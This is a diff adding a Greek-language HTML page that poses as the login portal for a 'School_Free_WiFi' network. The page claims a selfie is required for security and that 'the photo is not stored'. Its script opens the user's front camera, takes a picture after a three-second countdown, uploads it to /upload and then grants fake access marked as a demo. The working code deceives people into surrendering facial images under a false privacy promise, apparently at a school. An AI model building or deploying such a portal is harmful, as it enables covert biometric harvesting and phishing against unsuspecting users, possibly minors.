@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+<meta charset="UTF-8">
+<title>School_Free_WiFi</title>
+</head>
+<body style="text-align:center;font-family:sans-serif">
+<h2>Σύνδεση στο School_Free_WiFi</h2>
+<p>Για λόγους ασφαλείας απαιτείται επιβεβαίωση χρήστη</p>
+<p><small>Η φωτογραφία δεν αποθηκεύεται</small></p>
+<video id="video" autoplay playsinline style="width:80%"></video>
+<p id="count">3</p>
+<canvas id="canvas" style="display:none"></canvas>
+<script>
+const video = document.getElementById("video");
+const count = document.getElementById("count");
+navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"} })
+.then(s => {
+  video.srcObject = s;
+  let t = 3;
+  const i = setInterval(()=>{
+    t--;
+    count.innerText = t;
+    if(t===0){
+      clearInterval(i);
+      take();
+    }
+  },1000);
+});
+function take(){
+  const c = document.getElementById("canvas");
+  c.width = video.videoWidth;
+  c.height = video.videoHeight;
+  c.getContext("2d").drawImage(video,0,0);
+  c.toBlob(b=>{
+    const f = new FormData();
+    f.append("selfie",b);
+    fetch("/upload",{method:"POST",body:f})
+    .then(()=>alert("✅ Πρόσβαση στο WiFi (Demo)"));
+  });
+}
+</script>
+</body>
+</html>
